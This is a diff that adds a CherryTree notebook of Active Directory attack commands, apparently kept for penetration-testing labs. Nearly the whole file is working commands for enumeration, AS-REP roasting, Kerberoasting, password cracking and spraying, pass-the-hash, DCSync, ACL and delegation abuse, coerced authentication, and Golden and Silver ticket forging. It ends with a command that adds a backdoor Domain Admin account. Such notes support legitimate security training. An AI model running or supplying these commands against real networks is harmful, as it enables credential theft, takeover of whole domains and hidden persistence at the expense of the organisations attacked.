@@ -1,0 +1,255 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Offensive Security" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+    <rich_text></rich_text>
+
+    <node name="05. Active Directory Attack Chains" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="AD Attack Chain Overview" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>PROVIDED INITIAL DOMAIN CREDS (stephanie:Password123)
+         │
+         ▼
+Phase 1: RAPID SYSTEMATIC AD ENUMERATION
+         Map structures via BloodHound, query properties over SMB with NetExec, list objects over LDAP
+         │
+         ▼
+Phase 2: CONFIGURATION ATTACKS &amp; QUICK WINS (Execute all vectors concurrently)
+         ├── AS-REP Roasting (Accounts lacking pre-auth requirements)
+         ├── Kerberoasting (Extract service ticket hashes matching targeted SPN names)
+         ├── Parsing account descriptions attributes for plaintext password strings
+         ├── Harvesting exposed deployment scripts across open corporate shares
+         └── Extracting cpassword variables out of GPP policy XML files within SYSVOL
+         │
+         ▼
+Phase 3: ELEVATING FOOTHOLD ON LOCAL SYSTEMS (Capture local user flag)
+         Apply standalone privilege escalation tactics on MS01 to capture administrative memory states
+         │
+         ▼
+Phase 4: SUB-NET ROUTING &amp; LATERAL MOVEMENT (Pivot context to internal zone)
+         Establish tunnel infrastructure through MS01 -&gt; target internal node MS02 via harvested credentials
+         │
+         ▼
+Phase 5: RESTRUCTURING DOMAIN OBJECT ACCESS (Escalate token context to Domain Admin)
+         Abuse delegation rules, modify structural object ACLs, or invoke DCSync database updates
+         │
+         ▼
+Phase 6: ABSOLUTE DC CONTROL (Capture root domain flag)
+         Connect to the DC as a Domain Admin -&gt; dump NTDS database -&gt; establish a Golden Ticket for persistence
+</rich_text>
+      </node>
+
+      <node name="Phase 1 - Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>bloodhound-python -u stephanie -p 'Password123' -d corp.local -ns 192.168.x.100 -c All --zip
+# Remote automated AD domain trust mapping ingestion (Linux)
+--------------------------------------------------
+.\SharpHound.exe -c All --domain corp.local --zipfilename bh.zip
+# In-network AD object relational mapping discovery (Windows)
+--------------------------------------------------
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' --shares --users --groups --pass-pol
+# Map shared directories, users, groups, and password execution policies
+--------------------------------------------------
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' --loggedon-users
+# Hunt for live active logged-on user sessions on a target host
+--------------------------------------------------
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M spider_plus --share 'Department Shares'
+# Automated directory spidering and asset inventory mapping
+--------------------------------------------------
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+# Advanced recursive multi-threaded directory-only listing
+--------------------------------------------------
+ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(&amp;(objectClass=user)(description=*))" sAMAccountName description
+# Targeted LDAP query tracking cleartext access tokens inside description attributes
+--------------------------------------------------
+rpcclient -U "forend" --password "Klmcargo2" 172.16.5.5
+# Establish authenticated interactive MS-RPC pipe session
+--------------------------------------------------
+rpcclient $&gt; enumdomusers
+# Enumerate all domain users and RIDs natively inside rpcclient
+--------------------------------------------------
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+# Enumerate Domain Admins group members via LDAP queries
+--------------------------------------------------
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+# Recursive search for privileged users with nested group membership
+--------------------------------------------------
+. .\PowerView.ps1
+# Load PowerView module script into current PowerShell environment
+--------------------------------------------------
+Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description}
+# PowerView: Query active user properties and filter for descriptions
+--------------------------------------------------
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+# PowerView: Recursively list all members of a group including nested memberships
+--------------------------------------------------
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
+# PowerView: Audit inbound permissions on high-value targets for write/force rights
+--------------------------------------------------
+Find-InterestingDomainAcl
+# PowerView: Perform an extensive, unfiltered search for interesting ACLs across the domain
+--------------------------------------------------
+.\SharpView.exe Get-DomainUser -Identity forend
+# SharpView: Enumerate user properties using the .NET port of PowerView
+--------------------------------------------------
+.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+# Snaffler: Scan domain hosts for readable shares and hunt for sensitive file data
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Phase 2 - Credential Attacks" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>GetNPUsers.py corp.local/ -usersfile domain_users.txt -dc-ip 192.168.x.100 -no-pass -format hashcat
+# Check global domain object dictionary files for disabled pre-auth parameters
+--------------------------------------------------
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+# Native ticket extraction requests targeting AS-REP roastable signatures (Windows)
+--------------------------------------------------
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# Offline decryption of extracted AS-REP pre-authentication ticket hashes
+--------------------------------------------------
+GetUserSPNs.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -outputfile kerb.txt
+# Request service ticket containers mapped to core application principals (Linux)
+--------------------------------------------------
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+# Request tickets for highly privileged accounts with single-line hash formatting (Windows)
+--------------------------------------------------
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# Offline decryption of extracted SPN account TGS ticket hashes
+--------------------------------------------------
+nxc smb 192.168.x.100 -u domain_users.txt -p 'Password123' --continue-on-success 2&gt;/dev/null | grep "+"
+# Running low-velocity multi-account domain password sprays to avoid lockouts
+--------------------------------------------------
+kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Corp2024!'
+# Kerbrute: Programmatic password spraying with lockout awareness
+--------------------------------------------------
+nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
+# Automated harvesting of encrypted Group Policy Preferences passwords from domain volumes
+--------------------------------------------------
+smbclient //192.168.x.100/SYSVOL -U 'corp.local/stephanie%Password123'
+# Manual authenticated session interrogation of Sysvol allocation partitions
+--------------------------------------------------
+find /mnt/sysvol -name "*.xml" 2&gt;/dev/null | xargs grep -l "cpassword"
+# Scan shared policy configurations XML repositories for writable passwords
+--------------------------------------------------
+gpp-decrypt &lt;CPASSWORD_VALUE&gt;
+# Decrypt the extracted cpassword element using public AES keys
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Phase 3 &amp; 4 - Lateral Movement" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>nxc smb &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt; --local-auth
+# Testing inbound target network access profiles using discovered local account hashes
+--------------------------------------------------
+psexec.py corp.local/Administrator@&lt;TARGET_IP&gt; -hashes :&lt;NTLM_HASH&gt;
+# Spawning interactive remote process terminals via injected NT hashes strings (Impacket)
+--------------------------------------------------
+evil-winrm -i &lt;TARGET_IP&gt; -u Administrator -H &lt;NTLM_HASH&gt;
+# Spawning interactive remote process terminals via injected NT hashes strings (WinRM)
+--------------------------------------------------
+.\Rubeus.exe triage
+# Triage auditing of stored Kerberos authentication tickets in current session memory
+--------------------------------------------------
+.\Rubeus.exe ptt /ticket:&lt;BASE64_TICKET&gt;
+# Injecting extracted Base64 Kerberos ticket strings into system volatile space
+--------------------------------------------------
+.\Rubeus.exe asktgt /user:administrator /rc4:&lt;NTLM_HASH&gt; /domain:corp.local /dc:192.168.x.100 /ptt
+# Generating remote authentication tickets natively via stored secret passwords (Overpass-the-Hash)
+--------------------------------------------------
+export KRB5CCNAME=/tmp/ticket.ccache
+# Registering exfiltrated credential caches for corporate Kerberos authenticated access paths (Linux)
+--------------------------------------------------
+psexec.py -k -no-pass corp.local/administrator@&lt;TARGET_FQDN&gt;
+# Executing administrative code processes using loaded Kerberos credential caches
+--------------------------------------------------
+getTGT.py corp.local/user -hashes :&lt;NTLM_HASH&gt; -dc-ip 192.168.x.100
+# Requesting outbound domain TGT sessions over network channels via NT hashing arrays (Linux)
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Phase 5 - Domain PrivEsc" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
+# Launching remote DCSync administrative accounts replication requests (Linux)
+--------------------------------------------------
+lsadump::dcsync /user:krbtgt /domain:corp.local
+# Native DCSync active directory credential extraction loops (Mimikatz)
+--------------------------------------------------
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force) -Credential $cred
+# Forcing domain object security secret resets via Write configuration rights abuses
+--------------------------------------------------
+Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
+# Direct account propagation into privileged security group objects structures
+--------------------------------------------------
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity stephanie -Rights DCSync
+# Forcing arbitrary assignment of DCSync security rights over active domain controllers
+--------------------------------------------------
+bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' add genericAll "CN=Domain Admins,CN=Users,DC=ignite,DC=local" aaru
+# BloodyAD: Grant GenericAll on security groups to gain full configuration control
+--------------------------------------------------
+bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' add dcsync kinjal
+# BloodyAD: Inject complete directory replication rights (GetChangesAll) onto a controlled user
+--------------------------------------------------
+bloodyAD -u geet -p 'Password@1' -d ignite.local --host 192.168.1.11 add computer fakecomp 'Password@123'
+# BloodyAD: Create fake computer account to act as the delegation bridge head (RBCD)
+--------------------------------------------------
+bloodyAD --host 192.168.1.11 -u geet -p 'Password@1' -d ignite.local add rbcd 'DC$' 'fakecomp$'
+# BloodyAD: Configure RBCD impersonation pathway by writing fake computer SID to target DC
+--------------------------------------------------
+impacket-getST ignite.local/'fakepc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.11
+# Request constrained impersonation ticket for RBCD attack
+--------------------------------------------------
+bloodyAD --host 192.168.1.11 -u sita -p Password@1 -d ignite.local add shadowCredentials DC$
+# BloodyAD: Register public key mapping directly into target computer's msDS-KeyCredentialLink (Shadow Creds)
+--------------------------------------------------
+Get-DomainUser -TrustedToAuth | select samaccountname,msDS-AllowedToDelegateTo
+# Searching the domain schema for accounts assigned trusted-to-authentication privileges (Constrained Delegation)
+--------------------------------------------------
+getST.py -spn cifs/&lt;TARGET_FQDN&gt; -impersonate Administrator -dc-ip 192.168.x.100 'corp.local/&lt;DELEG_USER&gt;:&lt;DELEG_PASS&gt;'
+# Exploiting constrained delegation objects via S4U service ticket generation loops
+--------------------------------------------------
+Get-DomainComputer -Unconstrained | select name,dnshostname
+# Scanning domain compute nodes to identify unconstrained delegation configurations weaknesses
+--------------------------------------------------
+.\Rubeus.exe monitor /interval:5 /filteruser:DC$
+# Launching active monitoring infrastructure arrays targeting incoming security token transactions
+--------------------------------------------------
+python3 printerbug.py corp.local/stephanie:'Password123'@&lt;DC_IP&gt; &lt;UNCONS_DELEG_IP&gt;
+# Coercing high-privilege domain assets connection streams via legacy spooler protocols (PrinterBug)
+--------------------------------------------------
+python3 PetitPotam.py -u stephanie -p 'Password123' &lt;UNCONS_DELEG_IP&gt; &lt;DC_IP&gt;
+# Coercing direct inbound domain controller connections via alternate network shares (PetitPotam)
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Phase 6 - Domain Dominance &amp; Trusts" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>lookupsid.py corp.local/user:'pass'@192.168.x.100 | grep "Domain SID"
+# Extract domain SID for Golden Ticket generation
+--------------------------------------------------
+ticketer.py -nthash &lt;KRBTGT_NTLM_HASH&gt; -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local Administrator
+# Forging corporate Golden Tickets identities sessions (Linux)
+--------------------------------------------------
+kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:&lt;KRBTGT_NTLM_HASH&gt; /ptt
+# Native assembly forging of persistent active directory corporate Golden Tickets (Mimikatz)
+--------------------------------------------------
+ticketer.py -nthash &lt;SERVICE_ACCOUNT_NTLM&gt; -domain-sid S-1-5-21-XXX -domain corp.local -spn cifs/&lt;TARGET_FQDN&gt; Administrator
+# Crafting targeted corporate Silver Tickets for specific host resource channel interceptions
+--------------------------------------------------
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+# Extract the child domain KRBTGT NTLM hash via DCSync for trust attacks
+--------------------------------------------------
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+# Forge the Golden Ticket injecting the Parent Enterprise Admins SID into ExtraSids (Child-to-Parent)
+--------------------------------------------------
+raiseChild.py -target-exec 172.16.5.5 -child-fqdn LOGISTICS.INLANEFREIGHT.LOCAL -clear-passwords INLANEFREIGHT.LOCAL/administrator
+# Automate child-to-parent domain escalation entirely using raiseChild
+--------------------------------------------------
+secretsdump.py corp.local/Administrator:'pass'@192.168.x.100 -just-dc
+# Mass extraction triage dump of corporate domains configuration parameters secrets
+--------------------------------------------------
+net user backdoor P@ssw0rd! /add /domain &amp;&amp; net group "Domain Admins" backdoor /add /domain
+# Injecting persistent local accounts entities inside the wide active directory schema trees
+--------------------------------------------------</rich_text>
+      </node>
+
+    </node>
+
+  </node>
+</cherrytree>
